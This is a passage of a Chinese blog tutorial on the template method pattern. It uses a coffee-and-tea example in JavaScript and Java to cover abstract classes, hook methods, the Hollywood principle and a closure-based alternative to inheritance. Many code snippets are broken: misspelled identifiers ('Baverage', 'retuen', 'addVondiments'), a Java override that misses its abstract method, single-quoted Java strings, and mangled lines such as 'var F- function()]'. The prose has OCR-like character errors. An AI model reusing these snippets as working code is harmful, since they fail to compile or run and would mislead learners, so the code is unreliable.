class="line"><span class="keyword">var</span> coffee = <span class="keyword">new</span> <span class="title class_">Coffee</span>();</span><br><span class="line">coffee.<span class="title function_">init</span>();</span><br></pre></td></tr></table></figure><p>至此我们的Coffee类已经完成了，当调用coffee对象的init方法时，由于coffee对象和Coffee构造器的原型prototype上都没有对应的init方法，所以该请求会顺着原型链，被委托给Coffee的”父类”Beverage原型上的init方法。</p><p>而Beverage.prototype.init方法中已经规定好了泡饮料的顺序，所以我们能成为地泡出一杯咖啡，代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Baverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">boilWater</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">brew</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pourInCup</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addCondiments</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来照葫芦画瓢，来创建我们的Tea类：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Tea</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Beverage</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">brew</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用沸水侵泡茶叶&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pourInCup</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把茶叶倒进杯子&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addCondiments</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;加柠檬&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tea = <span class="keyword">new</span> <span class="title class_">Tea</span>();</span><br><span class="line">tea.<span class="title function_">init</span>();</span><br></pre></td></tr></table></figure><p>本章一直讨论的是模板方法模式，那么在上面的例子中，到底谁才是所谓的模板方法呢？</p><p><strong>Beverage.prototype.init</strong></p><p>Beverage.prototype.init被称为模板方法的原因是，该方法中封装了子类的算法框架，它作为一个算法的模板，指导子类以何种顺序去执行哪些方法。在Beverage.prototype.init方法中，算法内的每一步骤都清楚地展示在我们眼前。</p></li></ol><h3 id="三、抽象类"><a href="#三、抽象类" class="headerlink" title="三、抽象类"></a>三、抽象类</h3><p>首先要说明的是，模板方法模式是一种严重依赖抽象类地设计模式。JavaScript在语言层面并没有提供对抽象类的支持，我们也是很难模拟抽象类的实现。</p><ol><li><h4 id="抽象类的作用"><a href="#抽象类的作用" class="headerlink" title="抽象类的作用"></a>抽象类的作用</h4><p>在Java中，类分为两种，一种为具体类，另一种为抽象类。具体类可以被实例化，抽象类不能被实例化，要了解抽象类不能被实例化的原因，我们可以思考”饮料”这个抽象类。</p><p>想象这样一个场景：我们口渴了，去便利店想买一瓶饮料，我们不能直接跟店员说：”来一瓶饮料。”如果我们这样说了，那么店员接下来肯定会问：”要什么饮料？”饮料只是一个抽象名词，只有当我们真正明确了的饮料类型之后，才能得到一杯咖啡、茶、或者可乐。</p><p>由于抽象类不能被实例化，如果有人编写一个抽象类，那么这个抽象类一定是用来被某些具体类继承的。</p><p>抽象类和接口一样可以用于向上转型，在静态类型语言中，编译器对类型的检查总是一个绕不过的话题与困扰。虽然类型检查可以提高程序的安全性，但繁琐而严格的类型检查也时常会让程序员觉得麻烦。把对象的真正类型隐藏在抽象类或者接口之后，这些对象才可以被互相替换使用。这可以让我们的Java程序尽量遵守依赖倒置原则。</p><p>除了用于向上转型，抽象类也可以表示一种锲约。继承了这个抽象类的所有子类都将拥有跟抽象类一致的接口方法，抽象类的主要作用就是为它的子类定义这些公共接口。如果我们在子类中删掉了这些方法中的某一个，那么将不能通过编译器的检查，这在某些场景下是非常有用的，比如在模板方法模式中，Beverage类的init方法里规定了冲泡一杯饮料的顺序如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">boilWater</span>();      <span class="comment">// 把水煮沸</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">brew</span>();           <span class="comment">// 用水泡原料</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">pourInCup</span>();      <span class="comment">// 把原料倒进杯子</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">addCondiments</span>();  <span class="comment">// 添加调料</span></span><br></pre></td></tr></table></figure><p>如果在Coffee子类中没有实现对应的brew方法，那么我们百分之百得不到一杯咖啡。既然父类规定了子类的方法和执行这些方法的顺序，子类应该拥有这些方法，并提供正确的实现。</p></li><li><h4 id="抽象方法和具体方法"><a href="#抽象方法和具体方法" class="headerlink" title="抽象方法和具体方法"></a>抽象方法和具体方法</h4><p>抽象方法声明在抽象类中，抽象方法并没有具体的实现过程，是一些”哑”方法。比如Beverage类中的brew方法、pourInCup方法和addCondiments方法，都被声明为抽象方法。当子类继承了这个抽象类时，必须重写父类的抽象方法。</p><p>除了抽象方法外，如果每个子类中都有一些同样的具体实现方法，那这些方法也可以选择放在抽象类中，这可以节省代码以达到复用的效果，这些方法叫作具体方法。当代码需要改变时，我们只需要改动抽象类里的具体方法就可以了。比如饮料中的boilWater方法，假设冲泡所有的饮料之前，都要先把水煮沸，那我们自然可以把boilWater方法放进抽象类Beverage中。</p></li><li><h4 id="用Java实现Coffee-or-Tea例子"><a href="#用Java实现Coffee-or-Tea例子" class="headerlink" title="用Java实现Coffee or Tea例子"></a>用Java实现Coffee or Tea例子</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Beverage</span> &#123;              <span class="comment">// 饮料抽象类</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;                        <span class="comment">// 模板方法</span></span><br><span class="line">        boilWater();</span><br><span class="line">        brew();</span><br><span class="line">        pourInCup();</span><br><span class="line">        addCondiments();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">boilWater</span><span class="params">()</span>&#123;                         <span class="comment">// 具体方法boilWater</span></span><br><span class="line">        System.out.println(<span class="string">&#x27;把水煮沸&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">brew</span><span class="params">()</span>;                     <span class="comment">// 抽象方法brew</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">addCondiments</span><span class="params">()</span>;     <span class="comment">// 抽象方法addCondiments</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">pourInCup</span><span class="params">()</span>;                <span class="comment">// 抽象方法pourCup</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Coffee</span> <span class="keyword">extends</span> <span class="title class_">Beverage</span> &#123;        <span class="comment">// Coffee类</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">brew</span><span class="params">()</span> &#123;                             <span class="comment">// 子类中重写brew方法</span></span><br><span class="line">        System.out.println(<span class="string">&#x27;用沸水冲泡咖啡&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">pourInCup</span><span class="params">()</span> &#123;                        <span class="comment">// 子类中重写pourInCup方法</span></span><br><span class="line">        System.out.println(<span class="string">&#x27;把咖啡倒进杯子&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addVondiments</span><span class="params">()</span> &#123;                    <span class="comment">// 子类中重写addVondiments方法</span></span><br><span class="line">        System.out.println(<span class="string">&#x27;加糖和牛奶&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tea</span> <span class="keyword">extends</span> <span class="title class_">Beverage</span> &#123;</span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">brew</span><span class="params">()</span> &#123;                             <span class="comment">// 子类中重写brew方法</span></span><br><span class="line">        System.out.println(<span class="string">&#x27;用沸水冲泡茶叶&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">pourInCup</span><span class="params">()</span> &#123;                        <span class="comment">// 子类中重写pourInCup方法</span></span><br><span class="line">        System.out.println(<span class="string">&#x27;把茶倒进杯子&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addVondiments</span><span class="params">()</span> &#123;                    <span class="comment">// 子类中重写addVondiments方法</span></span><br><span class="line">        System.out.println(<span class="string">&#x27;加柠檬&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepareRecipe</span><span class="params">(Beverage heverage)</span>&#123;</span><br><span class="line">        heverage.init();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="type">Beverage</span> <span class="variable">coffee</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Coffee</span>();       <span class="comment">// 创建coffee对象</span></span><br><span class="line">        prepareRecipe(coffee);                <span class="comment">// 开始泡咖啡</span></span><br><span class="line">        <span class="comment">// 把水煮沸</span></span><br><span class="line">        <span class="comment">// 用沸水冲泡咖啡</span></span><br><span class="line">        <span class="comment">// 把咖啡倒进杯子</span></span><br><span class="line">        <span class="comment">// 加糖和牛奶</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">Beverage</span> <span class="variable">tea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tea</span>();             <span class="comment">// 创建tea对象</span></span><br><span class="line">        prepareRecipe(tea);                   <span class="comment">// 开始泡茶</span></span><br><span class="line">        <span class="comment">// 把水煮沸</span></span><br><span class="line">        <span class="comment">// 用沸水冲泡茶叶</span></span><br><span class="line">        <span class="comment">// 把茶倒进杯子</span></span><br><span class="line">        <span class="comment">// 加柠檬</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="JavaScript没有抽象类的缺点和解决方案"><a href="#JavaScript没有抽象类的缺点和解决方案" class="headerlink" title="JavaScript没有抽象类的缺点和解决方案"></a>JavaScript没有抽象类的缺点和解决方案</h4><p>JavaScript并没有从语法层面提供对抽象类的支持。抽象类的第一个作用是隐藏对象的具体类型，由于JavaScript是一门”类型模糊”的语言，所以隐藏对象的类型在JavaScript中并不重要。</p><p>另一方面，当我们在JavaScript中使用原型继承来模拟传统的类式继承时，并没有编译器帮助我们进行任何形式的检查，我们也没有办法保证子类会重写父类中的”抽象方法”。</p><p>我们知道，Beverage.prototype.init方法作为模板方法，已经规定了子类的算法框架，代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Baverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">boilWater</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">brew</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pourInCup</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addCondiments</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们的Coffee类或者Tea类忘记实现这4个方法中的一个呢？拿brew方法举例，如果我们忘记编写Coffee.prototype.brew方法，那么当请求coffee对象的brew时，请求会顺着原型链找到Beverage”父类”对应的Beverage.prototype.brew方法，而Beverage.prototype.brew方法到目前为止是一个空方法，这显然是不能符合我们需要的。</p><p>在Java中编译器会保证子类会重写父类中的抽象方法，但在JavaScript中却没有进行这些检查工作。我们在编写代码的时候得不到任何形式的警告，完全寄托于程序员的记忆力和自觉性是很危险的，特别是当我们使用模板方法模式这种完全依赖继承而实现的设计模式时。</p><p>下面提供两种变通的解决方案。</p><ul><li><p>第1种方案是用鸭子类型来模拟接口检查，以便确保子类中确实重写了父类的方法。但模拟接口检查会带来不必要的复杂性，而且要求程序员主动进行这些接口检查，这就要求我们在业务代码中添加一些跟业务逻辑无关的代码。</p></li><li><p>第2种方案是让Bever.prototype.brew等方法直接抛出一个异常，如果因为粗心忘记编写Coffee.prototype.brew方法，那么至少我们会在程序运行时得到一个错误：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">brew</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;子类必须重写brew方法&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pourInCup</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;子类必须重写pourInCup方法&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addCondiments</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;子类必须重写addCondiments方法&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p>第2种解决方案的优点是实现简单，付出的额外代价很少；缺点是我们得到错误信息的时间点太靠后。</p><p>我们一共有3次机会得到这个错误信息，第1次是在编写代码的时候，通过编译器的检查来得到错误信息；第2次是在创建对象的时候用鸭子类型来进行”接口检查”；而目前我们不得不利用最后一次机会，在程序运行过程中才知道哪里发生了错误。</p></li></ol><h3 id="四、模板方法模式的使用场景"><a href="#四、模板方法模式的使用场景" class="headerlink" title="四、模板方法模式的使用场景"></a>四、模板方法模式的使用场景</h3><p>从大的方面来讲，模板方法模式常被架构师用于搭建项目的框架，架构师定好了框架的骨架，程序员继承框架的结构之后，负责往里面填空，比如Java程序员大多数使用过HttpServlet技术来开发项目。</p><p>一个基于HttpServlet的程序包含7个生命周期，这7个生命周期分别对应一个do方法。</p><p><code>doGet()</code></p><p><code>doHead()</code></p><p><code>doPost()</code></p><p><code>doPut()</code></p><p><code>doDelete()</code></p><p><code>doOption()</code></p><p><code>doTrace()</code></p><p>HttpServlet类还提供了一个service方法，它就是这里的模板方法，service规定了这些do方法的执行顺序，而这些do方法的具体实现则需要HttpServlet的子类来提供。</p><p>在Web开发中也能找到很多模板方法模式的适用场景，比如我们在构建一系列的UI组件，这些组件的构建过程一般如下所示：</p><ol><li>初始化一个div容器</li><li>通过ajax请求拉取相应的数据</li><li>把数据渲染到div容器里面，完成组件的构造</li><li>通知用户组件渲染完毕</li></ol><p>任何组件都遵循上面的4步，其中第1步和第4步是相同的，第2步不同的地方只是请求ajax的远程地址，第3步不同的地方是渲染数据的方式。</p><p>于是我们可以把这4个步骤都抽象到父类的模板方法里面，父类中还可以顺便提供第1步和第4步的具体实现。当子类继承这个父类之后，会重写模板方法里面的第2步和第3步。</p><h3 id="五、钩子方法"><a href="#五、钩子方法" class="headerlink" title="五、钩子方法"></a>五、钩子方法</h3><p>通过模板方法模式，我们在父类中封装了子类的算法框架。这些算法框架在正常状态下是适用于大多数子类的，但如果有一些特别”个性”的子类呢？比如我们在饮料类Beverage中封装了饮料的冲泡顺序：</p><ol><li>把水煮沸‘</li><li>用沸水冲泡饮料</li><li>把饮料倒进杯子</li><li>加调料</li></ol><p>这4个冲泡饮料的步骤适用于咖啡和茶，在饮料店里，根据这4个步骤制作出来的咖啡和茶，一直顺利地提供给绝大部分客人享用。但有一些客人喝咖啡是不加调料（糖和牛奶）的。既然Beverage作为父类，已经规定好了冲泡饮料的4个步骤，那么有什么办法可以让子类不受这个约束呢？</p><p><strong>钩子方法（hook）</strong>可以用来解决这个问题，放置钩子是隔离变化的一种常见手段。我们在父类中容易变化的地方放置钩子，钩子可以有一个默认的实现，究竟要不要”挂钩”，这由子类自行决定。钩子方法的返回结果决定了模板方法后面部分的执行步骤，也就是程序接下来的走向，这样一来，程序就拥有了变化的可能。</p><p>在这个例子里，我们把挂钩的名字定为customerWantsCondiments，接下来将挂钩放入Beverage类，看看如何得到一杯不需要糖和牛奶的咖啡：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Beverage</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">boilWater</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把水煮沸&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">brew</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;子类必须重写brew方法&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pourInCup</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;子类必须重写pourInCup方法&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addCondiments</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;子类必须重写addCondiments方法&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">customerWantsCondiments</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    retuen <span class="literal">true</span>;                             <span class="comment">// 默认需要调料</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">boilWater</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">brew</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pourInCup</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="title function_">customerWantsCondiments</span>())&#123;      <span class="comment">// 如果挂钩返回true，则需要调料</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">addCondiments</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CoffeeWithHook</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">CoffeeWithHook</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Beverage</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">CoffeeWithHook</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">brew</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用沸水冲泡咖啡&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">CoffeeWithHook</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pourInCup</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把咖啡倒进杯子&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">CoffeeWithHook</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addCondiments</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;加糖和牛奶&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">CoffeeWithHook</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">customerWantsCondiments</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&#x27;请问需要调料吗？&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> coffeeWithHook = <span class="keyword">new</span> <span class="title class_">CoffeeWithHook</span>();</span><br><span class="line">coffeeWithHook.<span class="title function_">init</span>();</span><br></pre></td></tr></table></figure><h3 id="六、好莱坞原则"><a href="#六、好莱坞原则" class="headerlink" title="六、好莱坞原则"></a>六、好莱坞原则</h3><p>学习完模板方法模式之后，引人一个新的设计原则——著名的”好莱坞原则”。<br>好莱坞无疑是演员的天堂，但好菜坞也有很多找不到工作的新人演员，许多新人演员在好菜坞把简历递给演艺公司之后就只有回家等待电话。有时候该演员等得不耐烦了，给演艺公司打电话询问情况，演艺公司往往这样回答：”不要来找我，我会给你打电话”</p><p>在设计中，这样的规则就称为好莱坞原则。在这一原则的指导下，我们允许底层组件将自己挂钩到高层组件中，而高层组件会决定什么时候、以何种方式去使用这些底层组件，高层组件对待底层组件的方式，跟演艺公司对待新人演员一样，都是“别调用我们，我们会调用你”</p><p>模板方法模式是好莱坞原则的个典型使用场景，它与好莱坞原则的联系非常明显，当我们用模板方法模式编写一个程序时，就意味着子类放弃了对自己的控制权，而是改为父类通知子类，哪些方法应该在什么时候被调用。作为子类，只负责提供一些设计上的细节。</p><p>除此之外，好莱坞原则还常常应用于其他模式和场景，例如发布一订阅模式和回调函数。</p><ul><li><p>发布-订阅模式</p><p>在发布一订阅模式中，发布者会把消息推送给订阅者，这取代了原先不断去fetch消息的形式。例如假设我们乘坐出租车去一个不了解的地方，除了每过5秒钟就问司机“是否到达目的地”之外，还可以在车上美美地睡上一觉，然后跟司机说好，等目的地到了就叫醒你。这也相当于好菜坞原则中提到的“别调用我们，我们会调用你”</p></li><li><p>回调函数</p><p>在ajax异步请求中，由于不知道请求返回的具体时间，而通过轮询去判断是否返回数据，这显然是不理智的行为。所以我们通常会把接下来的操作放在回调函数中，传人发起ajax异步请求的两数。当数据返回之后，这个回调两数才被执行，这也是好菜坞原则的一种体现。把需要执行的操作封装在回调两数里，然后把主动权交给另外一个函数。至于回调函数什么时候被执行，则是另外一个函数控制的。</p></li></ul><h3 id="七、真的需要”继承”吗"><a href="#七、真的需要”继承”吗" class="headerlink" title="七、真的需要”继承”吗"></a>七、真的需要”继承”吗</h3><p>模板方法模式是基于继承的一种设计模式，父类封装了子类的算法框架和方法的执行顺序，子类继承父类之后，父类通知子类执行这些方法，好菜坞原则很好地诠释了这种设计技巧，即高层组件调用底层组件。</p><p>通过模板方法模式，编写了一个Cofee orTea的例子。模板方法模式是为数不多的基于继承的设计模式，但JaasScrit语 实际上没有提供真正的类式继承，继承是通过对象与对象之间的委托来实现的。也就是说，虽然我们在形式上借鉴了提供类式继承的语言，但学习到的模板方法模式并不十分正宗。而且在JavaScripti这般灵活的语言中，实现这样一个例子，是否真的需要继承这种重武器呢?</p><p>在好莱坞原则的指导之下，下面这段代码可以达到和继承一样的效果。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Beverage</span> = <span class="keyword">function</span>(<span class="params"> param </span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> boilwater = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把水煮沸&#x27;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> brew = param.<span class="property">brew</span> || <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;必须传brew方法&#x27;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pourInCup = param.<span class="property">pouTInCup</span> || <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;必须传递 pourInCup方法&#x27;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addCondiments = param.<span class="property">addcondiments</span> || <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;必频传递addCondiments方法&#x27;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> F- <span class="keyword">function</span>(<span class="params"></span>)];</span><br><span class="line"></span><br><span class="line">    F.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">boilwater</span>();</span><br><span class="line"><span class="title function_">brew</span>();</span><br><span class="line"><span class="title function_">pourInCup</span>();</span><br><span class="line"><span class="title function_">addCondiments</span>();</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">return</span> F;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Coffee</span>-<span class="title class_">Beverage</span>(&#123;</span><br><span class="line">    <span class="attr">brew</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用沸水冲泡咖啡&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">pourInCup</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把咖啡倒进杯子&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">addcondiments</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;加糖和牛奶&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Tea</span> = <span class="title class_">Beverage</span>(&#123;</span><br><span class="line">    <span class="attr">brew</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用沸水侵泡茶叶&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">pourInCup</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把茶倒进杯子&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">addCondiments</span>: <span class="keyword">function</span>(<span 